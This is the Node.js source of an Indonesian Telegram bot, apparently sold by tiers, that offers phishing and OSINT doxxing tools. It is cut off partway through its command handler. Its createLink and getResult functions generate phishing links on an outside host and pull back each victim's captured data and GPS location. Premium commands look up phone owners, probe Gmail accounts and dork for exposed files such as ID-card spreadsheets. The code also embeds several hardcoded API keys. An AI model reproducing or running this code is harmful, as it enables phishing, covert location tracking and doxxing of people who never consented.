const portscanner = require("portscanner");
const fs = require("fs");
const os = require("os");
const axios = require("axios").default;
const FormData = require("form-data");
const htmlPdf = require("html-pdf");
const whoisJson = require("whois-json");
const http = require("http"); // or 'https' for https:// URLs
const https = require("https"); // or 'https' for https:// URLs
const truecallerjs = require("truecallerjs");
const emailRegex = /[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}/g;
const TelegramBot = require("node-telegram-bot-api");
const moment = require("moment");
const cheerio = require("cheerio");
const userAgent = require("user-agents");
const ping = require("ping");
const { exec, spawn } = require("child_process");
const PhoneNumber = require('awesome-phonenumber');


function getRandomUserAgent() {
  const randomAgent = new userAgent();
  return randomAgent.toString();
}

// Add this shuffle function to the code
function shuffleArray(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
  return array;
}

function googleIt(query) {
  return new Promise(async (resolve, reject) => {
    try {
      let { data } = await axios.get("https://www.google.com/search", {
        params: {
          q: query,
          hl: "id",
          filter: 0,
          biw: 1536,
          bih: 747,
          dpr: 1.25,
        },
        headers: {
          Accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
          "Accept-Language": "id,en-US;q=0.9,en;q=0.8",
          "User-Agent": getRandomUserAgent(),
        },
      });

      let $ = cheerio.load(data);
      let results = [];

      $("div.kvH3mc.BToiNc.UK95Uc").map((a, b) => {
        results.push({
          title: $(b).find("h3").text().trim(),
          url: $(b).find("a").attr("href"),
          header: $(b).find("cite").text().trim(),
          description:
            $(b).find("div.VwiC3b > span").text().trim() ||
            $(b).find("div.VwiC3b").text().trim() ||
            $("div.VwiC3b.yXK7lf.MUxGbd.yDYNvb.lyLwlc").text().trim(),
        });
      });

      if (results.length == 0) {
        $("div.MjjYud").map((a, b) => {
          results.push({
            title: $(b).find("h3").text().trim(),
            url: $(b).find("a").attr("href"),
            header: $(b).find("cite").text().trim(),
            description:
              $(b).find("div.VwiC3b > span").text().trim() ||
              $(b).find("div.VwiC3b").text().trim() ||
              $("div.VwiC3b.yXK7lf.MUxGbd.yDYNvb.lyLwlc").text().trim(),
          });
        });
      }

      resolve(shuffleArray(results)); // Shuffle the results array before resolving the promise
    } catch (e) {
      reject(e);
    }
  });
}

// Membaca konfigurasi dari config.json
const rawConfig = fs.readFileSync('config.json');
const config = JSON.parse(rawConfig);

// Inisialisasi bot dengan token
const bot = new TelegramBot(config.telegramToken, { polling: true });

const reportsFile = "reports.json";
let reports = [];

const idgc = -1001604699952;
let commandCounter = 12086;
const linkgc = "https://t.me/+00383W-4JE5hZWQ1";

// Fungsi untuk membaca file JSON
function readConfig() {
  try {
    const data = fs.readFileSync("language.json", "utf8");
    return JSON.parse(data);
  } catch (error) {
    console.error("Error reading language.json:", error);
    return {};
  }
}

// Fungsi untuk menulis ke file JSON
function writeConfig(config) {
  try {
  } catch (error) {
    console.error("Error writing to language.json:", error);
  }
}

// Fungsi untuk menerjemahkan pesan ke bahasa Inggris menggunakan API eksternal
async function translateToEnglish(text) {
  const apiKey = "zenzkey_bff36c6fa327";
  const url = `https://api.zahwazein.xyz/information/translate/en`;

  try {
    const response = await axios.get(url, {
      params: {
        query: text,
        apikey: apiKey,
      },
    });

    const data = response.data;
    if (data.status === "OK") {
      return data.result;
    } else {
      console.error("Terjemahan gagal:", data.status);
      return text; // Jika terjemahan gagal, kembalikan teks asli
    }
  } catch (error) {
    console.error("Terjadi kesalahan saat memanggil API terjemahan:", error);
    return text; // Jika terjadi kesalahan, kembalikan teks asli
  }
}

// Fungsi untuk menerjemahkan pesan ke bahasa Inggris menggunakan API eksternal
async function translateToRussian(text) {
  const apiKey = "zenzkey_bff36c6fa327";
  const url = `https://api.zahwazein.xyz/information/translate/ru`;

  try {
    const response = await axios.get(url, {
      params: {
        query: text,
        apikey: apiKey,
      },
    });

    const data = response.data;
    if (data.status === "OK") {
      return data.result;
    } else {
      console.error("Terjemahan gagal:", data.status);
      return text; // Jika terjemahan gagal, kembalikan teks asli
    }
  } catch (error) {
    console.error("Terjadi kesalahan saat memanggil API terjemahan:", error);
    return text; // Jika terjadi kesalahan, kembalikan teks asli
  }
}

// Function untuk mengirim pesan dengan membagi menjadi bagian-bagian yang lebih kecil jika terlalu panjang
async function sendMessage(chatId, text, options) {
  const maxMessageLength = 4096; // Batas panjang pesan
  let languageConfig = readConfig();

  if (languageConfig[chatId] === "english") {
    // Terjemahkan pesan ke bahasa Inggris jika languageConfig sesuai
    const translatedText = await translateToEnglish(text);

    if (translatedText.length <= maxMessageLength) {
      bot.sendMessage(chatId, translatedText, options);
    } else {
      const messageParts = splitTextIntoParts(translatedText, maxMessageLength);
      for (let i = 0; i < messageParts.length; i++) {
        bot.sendMessage(chatId, messageParts[i], options);
      }
    }
  } else if (languageConfig[chatId] === "russian") {
    // Terjemahkan pesan ke bahasa Inggris jika languageConfig sesuai
    const translatedText = await translateToRussian(text);

    if (translatedText.length <= maxMessageLength) {
      bot.sendMessage(chatId, translatedText, options);
    } else {
      const messageParts = splitTextIntoParts(translatedText, maxMessageLength);
      for (let i = 0; i < messageParts.length; i++) {
        bot.sendMessage(chatId, messageParts[i], options);
      }
    }
  } else {
    // Jika tidak perlu diterjemahkan, kirim pesan seperti biasa
    if (text.length <= maxMessageLength) {
      bot.sendMessage(chatId, text, options);
    } else {
      const messageParts = splitTextIntoParts(text, maxMessageLength);
      for (let i = 0; i < messageParts.length; i++) {
        bot.sendMessage(chatId, messageParts[i], options);
      }
    }
  }
}

// // Function untuk mengirim pesan dengan membagi menjadi bagian-bagian yang lebih kecil jika terlalu panjang
// function sendMessage(chatId, text, options) {
//     const maxMessageLength = 4096; // Batas panjang pesan

//     let languageConfig = readConfig();

//     if (text.length <= maxMessageLength) {
//       bot.sendMessage(chatId, text, options);
//     } else {
//       const messageParts = splitTextIntoParts(text, maxMessageLength);
//       for (let i = 0; i < messageParts.length; i++) {
//         bot.sendMessage(chatId, messageParts[i], options);
//       }
//     }
//   }

// Function untuk membagi teks menjadi bagian-bagian yang lebih kecil
function splitTextIntoParts(text, maxLength) {
  const parts = [];

  while (text.length > 0) {
    const part = text.substring(0, maxLength);
    parts.push(part);
    text = text.substring(maxLength);
  }

  return parts;
}

async function getArchiveInfo(query) {
  const apiUrl = `http://archive.org/wayback/available?url=${encodeURIComponent(
    query
  )}`;

  try {
    const response = await axios.get(apiUrl);
    if (
      response.data.archived_snapshots &&
      response.data.archived_snapshots.closest
    ) {
      const archiveInfo = response.data.archived_snapshots.closest;
      return archiveInfo;
    } else {
      throw new Error("Archive not found");
    }
  } catch (error) {
    throw new Error("Error fetching archive information");
  }
}

bot.on("callback_query", (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;

  console.log(callbackQuery.data);

  let languageConfig = readConfig();

  if (data === "indonesia" || data === "english" || data === "russian") {
    languageConfig[chatId] = data;
    fs.writeFileSync(
      "language.json",
      JSON.stringify(languageConfig, null, 2),
      "utf8"
    );
    console.log("Language config has been saved.");

    let messageText;
    if (data === "indonesia") {
      messageText = "Anda memilih bahasa Indonesia 🇮🇩";
    } else if (data === "english") {
      messageText = "You have chosen English 🇺🇸";
    } else if (data === "russian") {
      messageText = "Вы выбираете индонезийский 🇷🇺";
    }

    sendMessage(chatId, messageText);
    bot.deleteMessage(chatId, messageId);
  } else if (data === "lang") {
    const message =
      "Selamat datang di bot bahasa!\nSilakan pilih bahasa yang ingin Anda gunakan:";

    const options = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🇮🇩 Indonesia", callback_data: "indonesia" },
            { text: "🇺🇸 English", callback_data: "english" },
            { text: "🇷🇺 Russian", callback_data: "russian" },
          ],
        ],
      },
    };

    sendMessage(chatId, message, options);
  }
});

// bot.on('callback_query', (callbackQuery) => {
//   const data = callbackQuery.data;
//   const chatId = callbackQuery.message.chat.id;
//   const messageId = callbackQuery.message.message_id;

//   console.log(callbackQuery.data);

//   let languageConfig = readConfig();

//   if (data === "indonesia") {
//     languageConfig[chatId] = 'indonesia';
//     fs.writeFileSync('language.json', JSON.stringify(languageConfig, null, 2), 'utf8');
//     console.log("Language config has been saved.");
//     // writeConfig(languageConfig);
//     sendMessage(chatId, 'Anda memilih bahasa Indonesia 🇮🇩');
//     bot.deleteMessage(chatId, messageId);
//     return;
//   } else if (data === 'english') {
//     languageConfig[chatId] = 'english';
//     fs.writeFileSync('language.json', JSON.stringify(languageConfig, null, 2), 'utf8');
//     console.log("Language config has been saved.");
//     // writeConfig(languageConfig);
//     sendMessage(chatId, 'You have chosen English 🇺🇸');
//     bot.deleteMessage(chatId, messageId);
//     return;
//   }
// });
function isValidEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

const apiKeyUrl = "https://rasitechchannel.my.id/leakdata/apikey.json";

async function getExpiryDate(apiKey) {
  try {
    const response = await axios.get(apiKeyUrl);
    const apiKeys = response.data;

    let apikey_data = {
      expdate: null,
      daysLeft: 0,
    }; // Variable untuk menampung data api key dengan default value

    for (const data of apiKeys) {
      if (data.apikey === apiKey) {
        const expDate = new Date(data.expdate);
        const today = new Date();
        const diffTime = expDate - today;
        const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));

        // Menyimpan data api key ke dalam variabel apikey_data
        apikey_data = {
          expdate: data.expdate,
          daysLeft: diffDays,
        };

        break; // Keluar dari loop jika api key ditemukan
      }
    }

    return apikey_data;
  } catch (error) {
    console.error("Error retrieving data:", error.message);
    return null;
  }
}

// Fungsi untuk membaca database banned.json
function readBannedUsers() {
  try {
    const data = fs.readFileSync("banned.json");
    return JSON.parse(data);
  } catch (error) {
    return [];
  }
}

// Fungsi untuk menulis kembali database banned.json setelah perubahan
function writeBannedUsers(bannedUsers) {
  fs.writeFileSync("banned.json", JSON.stringify(bannedUsers));
}

function isUserBanned(userId) {
  const bannedUsers = readBannedUsers();
  return bannedUsers.includes(userId.toString());
}

async function createLink(msg, resp) {
  function between(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
  }

  try {
    const idjudul = between(1000, 10000);
    sendMessage(msg.chat.id, "Sedang Di Proses...");

    const formattedResp = resp.replace(/\s+/g, "-");
    const link = `https://links.sergappteknologi.my.id/create.php?nama=${formattedResp}-${idjudul}`;

    await axios.get(link);

    const resultMsg = `Title ID : ${formattedResp}-${idjudul}\nLink Phishing : https://links.sergappteknologi.my.id/?id=${formattedResp}-${idjudul}`;
    bot.sendMessage(msg.chat.id, resultMsg);

    sendMessage(msg.chat.id, "Selesai!");
  } catch (error) {
    sendMessage(
      msg.chat.id,
      "Terjadi error, silahkan cek @RasiTechChannel1 untuk informasi lebih lanjut."
    );
    console.log(error);
  }
}

async function getResult(msg, resp) {
  try {
    const result1 = await axios
      .get(`https://links.sergappteknologi.my.id/${resp}/result.txt`)
      .catch(() => {
        sendMessage(
          msg.chat.id,
          `Judul ID Tidak Ditemukan Atau Korban Belum Membuka. Tidak dapat mendapatkan result tanpa periznan lokasi`
        );
      });

    const lokasi1 = await axios
      .get(`https://links.sergappteknologi.my.id/${resp}/lokasi.txt`)
      .catch(() => {
        sendMessage(
          msg.chat.id,
          `Judul ID Tidak Ditemukan Atau Korban Belum Mengizinkan lokasi. Tidak dapat mendapatkan result periznan lokasi`
        );
      });

    sendMessage(
      msg.chat.id,
      `Result Tanpa Perizinan Lokasi :\n\n${result1.data}`
    );

    if (lokasi1 && lokasi1.data && lokasi1.data.length === 2) {
      sendMessage(
        msg.chat.id,
        `Result Dengan Perizinan Lokasi :\n\nhttps://maps.google.com/?q=${lokasi1.data.join(
          ","
        )}`
      );
      bot.sendLocation(
        msg.chat.id,
        parseFloat(lokasi1.data[0]),
        parseFloat(lokasi1.data[1])
      );
    }

    sendMessage(msg.chat.id, "Selesai!");
  } catch (error) {
    sendMessage(
      msg.chat.id,
      "Terjadi error, silahkan cek konsol untuk informasi lebih lanjut."
    );
    console.log(error);
  }
}

// Mendengarkan event "message" dari pengguna
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const messageText = msg.text;
  const messageId = msg.message_id;
  const userId = msg.from.id;

  if (isUserBanned(userId)) {
    sendMessage(
      chatId,
      "Anda telah dibanned dan tidak dapat menggunakan bot ini.\n\nKontak @rasirt2"
    );
    return;
  }

  let languageConfig = readConfig();

  if (!languageConfig[chatId]) {
    const message =
      "Selamat datang di bot bahasa!\nSilakan pilih bahasa yang ingin Anda gunakan:";

    const options = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🇮🇩 Bahasa Indonesia", callback_data: "indonesia" },
            { text: "🇺🇸 English", callback_data: "english" },
            { text: "🇷🇺 Russian", callback_data: "russian" },
          ],
        ],
      },
    };

    sendMessage(chatId, message, options);
    return;
  }

  //   if (userId !== 1613688326) {
  // sendMessage(chatId, `Bot sedang perbaikan!`)
  // return;
  //   }

  // bot.forwardMessage(-1001496130412,chatId, messageId)
  const inlineKeyboard = {
    inline_keyboard: [
      [
        {
          text: "User ID",
          url: `tg://user?id=${chatId}`,
        },
      ],
    ],
  };

  const language_options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🇮🇩 Bahasa Indonesia", callback_data: "indonesia" },
          { text: "🇺🇸 English", callback_data: "english" },
          { text: "🇷🇺 Russian", callback_data: "russian" },
        ],
      ],
    },
  };

  var isJoin = false;
  var isJoinGroup = false;
  // Pengecekan apakah user terdaftar dalam group atau tidak
  try {
    const chatMember = await bot.getChatMember("@RasiTechChannel1", userId);
    // Jika user merupakan anggota group
    if (
      chatMember &&
      (chatMember.status === "member" ||
        chatMember.status === "administrator" ||
        chatMember.status === "creator")
    ) {
      isJoin = true;
    }
  } catch (error) {
    console.error("Error saat melakukan pengecekan:", error);
  }
  try {
    const chatMember = await bot.getChatMember(idgc, userId);
    // Jika user merupakan anggota group
    if (
      chatMember &&
      (chatMember.status === "member" ||
        chatMember.status === "administrator" ||
        chatMember.status === "creator")
    ) {
      isJoinGroup = true;
    }
  } catch (error) {
    console.error("Error saat melakukan pengecekan:", error);
  }

  if (!isJoinGroup) {
    sendMessage(
      chatId,
      "Silahkan klik tombol di bawah untuk bergabung di group kami untuk dapat menggunakan bot ini",
      {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Join Group",
                url: linkgc,
              },
            ],
          ],
        },
      }
    );
    return;
  }
  if (!isJoin) {
    sendMessage(
      chatId,
      "Silahkan klik tombol di bawah untuk bergabung di channel kami untuk dapat menggunakan bot ini",
      {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Join Channel",
                url: `https://t.me/RasiTechChannel1`,
              },
            ],
          ],
        },
      }
    );
    return;
  }

  try {
    // Mengecek user ID pada database
    //  const response = await axios.get(`https://rasitechchannel.my.id/bot/phis/cek.php?id=` + msg.from.id);
    // const result = response.data;
    // console.log(result);

    if (msg.from.username) {
      // if (result === false) {
      //   const mentionText = `[${msg.from.first_name}](tg://user?id=${msg.from.id})`;
      //   const errorMessage = `${mentionText}, Anda harus login ke Bot @TeleScanCreatorBot untuk menggunakan bot.`;
      //   // Mengirim pesan alternatif dan menyimpan ID pesan baru
      //    await sendMessage(chatId, errorMessage, { parse_mode: 'Markdown' });
      //
      // Code below this line will not be executed
      //   return;
      // }
    } else {
      const noUsernameMessage =
        "Anda harus memiliki username Telegram untuk untuk menggunakan bot.";

      // You can handle the no username scenario here, e.g., send a message to the user
      await sendMessage(chatId, noUsernameMessage);

      // Code below this line will not be executed
      return;
    }
  } catch (error) {
    console.log(error);
    console.log("Terjadi kesalahan saat memeriksa database.");
  }

  const apiURL = `https://rasitechchannel.my.id/leakdata/cek.php?id=${userId}`;
  const response = await axios.get(apiURL);
  const isPremium = response.data;

  // sendMessage(-1001496130412, `User ID: <a href="tg://user?id=${chatId}">${chatId}</a>\nFrom ID: <a href="tg://user?id=${msg.from.id}">${msg.from.id}</a>\nFirst Name: <a href="tg://user?id=${chatId}">${msg.chat.first_name}</a>\nLast Name: <a href="tg://user?id=${chatId}">${msg.chat.last_name}</a>\nUsername: <a href="tg://user?id=${chatId}">${msg.chat.username}</a>\n`, {parse_mode:"HTML", reply_markup: JSON.stringify(inlineKeyboard)})
  console.log(msg);
  // Memisahkan teks menjadi array
  const command = messageText.split(" ")[0];
  const args = messageText.split(" ").slice(1);
  const query = args.join(" ");
  // Mengecek perintah yang dikirim oleh pengguna

  if (command.startsWith("/")) {
    commandCounter++;
  }

  switch (command) {
    case "/setid":

if (!isBotOwner(chatId)) return sendMessage(chatId, 'Anda bukan owner!')

    const newToken = query;

    // Mengganti token dalam konfigurasi
    config.truecaller = newToken;
    fs.writeFileSync('config.json', JSON.stringify(config, null, 2));
  
    bot.sendMessage(chatId, `Token bot telah diubah menjadi: ${newToken}`);

      break;
    case "/mac":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan MAC Address Seperti: /mac FC:FB:FB:01:FA:21"
        );


        const macAddress = query.toUpperCase();
      
        try {
          const response = await axios.get(`https://www.macvendorlookup.com/api/v2/${macAddress}`);
          if (response.data && response.data.length > 0) {
            const data = response.data[0];
const message = `
Company: ${data.company}
Address: ${data.addressL1}
          ${data.addressL2}
          ${data.addressL3}
Country: ${data.country}
Type: ${data.type}
`;
            bot.sendMessage(chatId, message);
          } else {
            bot.sendMessage(chatId, 'Tidak ada data ditemukan untuk MAC address yang diberikan.');
          }
        } catch (error) {
          console.error('Error:', error);
          bot.sendMessage(chatId, 'Terjadi kesalahan saat mengambil data.');
        }

      break;
    case "/cekno":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan Nomor Telepon Seperti: /cekno +6287XXXXXXXX"
        );
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );

        const cekno = new PhoneNumber(query);

        if (!cekno.isValid()) {
          bot.sendMessage(chatId, 'Nomor telepon tidak valid.');
          return;
        }
      
        const apiEndpoint = `https://www.ipqualityscore.com/api/json/phone/dfH0BCUIeaOrNmRr6SEwWjGtHD3Krs6W/${cekno.getNumber()}?strictness=1`;
      
        try {
          const response = await axios.get(apiEndpoint);
          const data = response.data;
      
         if (data.valid) {
            const message = formatPhoneInfo(data);
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
          } else {
            bot.sendMessage(chatId, 'Nomor telepon tidak valid atau tidak ditemukan informasi.');
          }
        } catch (error) {
          console.error('Error:', error);
          bot.sendMessage(chatId, 'Terjadi kesalahan saat mengambil data.');
        }
        
        break;
    case "/parseno":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan Nomor Telepon Seperti: /parseno +6287XXXXXXXX"
        );
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );

        const phoneNumberInput = query;

        // Membuat instance PhoneNumber dari awesome-phonenumber
        const phoneNumberInstance = new PhoneNumber(phoneNumberInput);
      
        if (!phoneNumberInstance.isValid()) {
          bot.sendMessage(chatId, 'Nomor telepon tidak valid.');
          return;
        }
      
        const phoneNumber = phoneNumberInstance.getNumber();
        const countryCode = phoneNumberInstance.getCountryCode();
        const countryCodeAlpha2 = phoneNumberInstance.getRegionCode();
      
        const apiKey = 'bdc_6f072eef183b403db60a14d10c8adf98'; // Ganti dengan API key yang sesuai
    
      
        try {
          const response = await axios.get(`https://api-bdc.net/data/phone-number-validate?number=${phoneNumber}&countryCode=${countryCodeAlpha2}&localityLanguage=id&key=${apiKey}`);
          const data = response.data;

          console.log(data)
      
          const arrayKeys = ['IsoAdminLanguages', 'Currency', 'WbRegion', 'WbIncomeLevel'];


          if (data.isValid) {
            const message = formatPhoneInfo(data);
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
          } else {
            bot.sendMessage(chatId, 'Nomor telepon tidak valid atau tidak ditemukan informasi.');
          }
        } catch (error) {
          console.error('Error:', error);
          bot.sendMessage(chatId, 'Terjadi kesalahan saat mengambil data.');
        }


        break
    case "/gid":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan Google ID Seperti: /gid 117543554779940******"
        );
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      sendMessage(
        chatId,
        "Berikut adalah hasil pencarian kontak sosmed\nManual cek",
        {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "💬 Review",
                  url: `https://www.google.com/maps/contrib/${query}`,
                },
                {
                  text: "👤 Plus Profile",
                  url: `https://plus.google.com/${query}`,
                },
              ],
              [
                {
                  text: "👤 Archive Plus",
                  url: `https://web.archive.org/web/*/plus.google.com/${query}`,
                },
              ],
            ],
          },
        }
      );
      break;
    case "/waapi":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /waapi halo");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(query + ` site:call.whatsapp.com`);
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/wacall":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /wacall video");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(query + ` site:call.whatsapp.com`);
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/wachat":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /chat hacker");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(query + ` site:wa.me/`);
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/chat":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /chat hacker");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(query + ` site:t.me/s/`);
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/grupwa":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /grupwa hacker");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(query + ` site:chat.whatsapp.com`);
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/ghunt":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan Username Gmail Seperti: /ghunt indonesia"
        );
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );

      axios
        .get(`https://osinteak.digital/ghunt.php?email=${query}`)
        .then((response) => {
          sendMessage(chatId, `Search: ${query}@gmail.com\n\n` + response.data); // Output dari respons URL akan dicetak di sini
        })
        .catch((error) => {
          sendMessage(chatId, `Error: ${error.message}`);
        });

      break;
    case "/phone":
      if (!query)
        return sendMessage(chatId, "Masukan Nomor Seperti: /phone 621234XXXX");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      axios
        .get(
          `https://api.zahwazein.xyz/information/phoneinfo?apikey=zenzkey_bff36c6fa327&query=${query}`
        )
        .then(async (response) => {
          if (
            response.data &&
            response.data.result &&
            response.data.result.general &&
            response.data.result.general[0] &&
            response.data.result.general[0].dork
          ) {
            const dorkIndex1 = response.data.result.general[0].dork;
            try {
              const results = await googleIt(dorkIndex1);
              let response = "";
              if (results.length > 0) {
                response = "Here are the search results:\n\n";
                results.slice(0, 5).forEach((result, index) => {
                  response +=
                    `<b>${index + 1}.</b> <a href="${result.url}">${
                      result.title
                    }</a>\n` +
                    `<b>Header:</b> ${result.header}\n` +
                    `<b>Description:</b> ${result.description}\n\n`;
                });
              } else {
                response = "No results found for your query.";
              }

              sendMessage(chatId, response, {
                parse_mode: "HTML",
                disable_web_page_preview: true,
              });
            } catch (err) {
              sendMessage(
                chatId,
                "Error occurred while searching. Please try again later."
              );
            }
            console.log("Dork index 1 pada General:");
            console.log(dorkIndex1);
          } else {
            console.log(
              "Data tidak ditemukan atau format respons tidak sesuai."
            );
          }
        })
        .catch((error) => {
          console.error(
            "Terjadi kesalahan saat mengambil data dari API:",
            error.message
          );
        });

      break;
    case "/gphoto":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /gphoto IMG");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(
          query + ` site:lh3.googleusercontent.com/`
        );
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/mail":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan Email Seperti: /mail contoh@gmail.com"
        );
      if (!isValidEmail(query))
        return sendMessage(chatId, "Input Email Invalid!");
      try {
        const results = await googleIt(`intext:"${query}"`);
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/gexcel":
      if (!query)
        return sendMessage(chatId, "Masukan Query Excel Seperti: /gexcel KTP");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(query + ` site:s3.amazonaws.com/`);
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/secretdoc":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /secretdoc osint");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(query + ` site:s3.amazonaws.com/`);
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
